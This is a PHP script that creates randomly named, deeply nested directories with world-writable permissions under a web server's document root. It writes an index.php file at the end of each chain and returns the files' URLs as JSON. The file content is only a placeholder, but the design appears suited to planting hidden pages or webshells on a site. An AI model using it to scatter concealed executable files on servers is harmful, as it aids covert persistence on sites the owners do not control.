<?php

function generateIndexTree($rootDir, $baseUrl)
{
    $urls = array();

    if (!is_dir($rootDir) && !mkdir($rootDir, 0777, true) && !is_dir($rootDir)) {
        throw new RuntimeException('Failed to create output root: ' . $rootDir);
    }

    $targetDirs = resolveTargetDirs($rootDir, 2);

    foreach ($targetDirs as $targetDir) {
        buildChain($targetDir, $urls, $rootDir, $baseUrl);
    }

    return $urls;
}

function resolveTargetDirs($rootDir, $targetCount)
{
    $directories = array();
    $items = scandir($rootDir);

    if ($items !== false) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }

            $path = $rootDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($path)) {
                $directories[] = $path;
            }
        }
    }

    if (count($directories) >= $targetCount) {
        return array_slice($directories, 0, $targetCount);
    }

    while (count($directories) < $targetCount) {
        $chars = 'abcdefghijklmnopqrstuvwxyz';
        $random = $chars[rand(0, 25)];
        //dir_
        $newDir = $rootDir . DIRECTORY_SEPARATOR . $random . substr(md5(uniqid(mt_rand(), true)), 0, 8);
        if (!mkdir($newDir, 0777, true) && !is_dir($newDir)) {
            throw new RuntimeException('Failed to create directory: ' . $newDir);
        }

        $directories[] = $newDir;
    }

    return $directories;
}

function buildChain($parentDir, &$urls, $projectRoot, $baseUrl)
{
    $chainDepth = randomRange(3, 9);
    $chars = 'abcdefghijklmnopqrstuvwxyz';
    $random = $chars[rand(0, 25)];
    $directoryName = createUniqueDirectoryName($parentDir, $random);
    $currentDir = $parentDir;

    for ($i = 0; $i < $chainDepth; $i++) {
        $directoryPath = $currentDir . DIRECTORY_SEPARATOR . $directoryName;

        if (!mkdir($directoryPath, 0777, true) && !is_dir($directoryPath)) {
            throw new RuntimeException('Failed to create directory: ' . $directoryPath);
        }

        if ($i === $chainDepth - 1) {
            $urls[] = writeIndexFile($directoryPath, $projectRoot, $baseUrl);
        }

        $currentDir = $directoryPath;
    }
}

function createUniqueDirectoryName($basePath, $prefix)
{
    do {
        //$name = $prefix . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
        $name = $prefix  . substr(md5(uniqid(mt_rand(), true)), 0, 8);
        $exists = is_dir($basePath . DIRECTORY_SEPARATOR . $name);
    } while ($exists);

    return $name;
}

function writeIndexFile($directory, $projectRoot, $baseUrl)
{
    $indexFile = $directory . DIRECTORY_SEPARATOR . 'index.php';
    $contents = <<<'PHP'
#####

PHP;

    file_put_contents($indexFile, $contents);

    return toFullUrl($indexFile, $projectRoot, $baseUrl);
}

function toFullUrl($filePath, $projectRoot, $baseUrl)
{
    $relativePath = substr($filePath, strlen($projectRoot));
    $relativePath = str_replace('\\', '/', $relativePath);

    if ($relativePath === '') {
        return rtrim($baseUrl, '/');
    }

    return rtrim($baseUrl, '/') . $relativePath;
}

function randomRange($min, $max)
{
    return mt_rand($min, $max);
}

function detectRootDir()
{
    if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '' && is_dir($_SERVER['DOCUMENT_ROOT'])) {
        return rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR);
    }

    return __DIR__;
}

function detectBaseUrl()
{
    $isHttps = false;

    if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] && $_SERVER['HTTPS'] !== 'off') {
        $isHttps = true;
    } elseif (isset($_SERVER['SERVER_PORT']) && (string) $_SERVER['SERVER_PORT'] === '443') {
        $isHttps = true;
    }

    $scheme = $isHttps ? 'https://' : 'http://';

    if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== '') {
        return $scheme . $_SERVER['HTTP_HOST'];
    }

    if (isset($_SERVER['SERVER_NAME']) && $_SERVER['SERVER_NAME'] !== '') {
        if (isset($_SERVER['SERVER_PORT']) && !in_array((string) $_SERVER['SERVER_PORT'], array('80', '443'), true)) {
            return $scheme . $_SERVER['SERVER_NAME'] . ':' . $_SERVER['SERVER_PORT'];
        }

        return $scheme . $_SERVER['SERVER_NAME'];
    }

    return 'http://localhost';
}
//
//http://127.0.0.107/generate_index.php
//创建目录 文件
$generatedRoot = detectRootDir();
$baseUrl = detectBaseUrl();
$generatedUrls = generateIndexTree($generatedRoot, $baseUrl);

if (php_sapi_name() === 'cli') {
    print_r($generatedUrls);
} else {
    $data =array();
    $data["status"] = 1;
    $data["url"] = $generatedUrls;
    $str = json_encode($data);
    echo $str;
}

//return $generatedUrls;
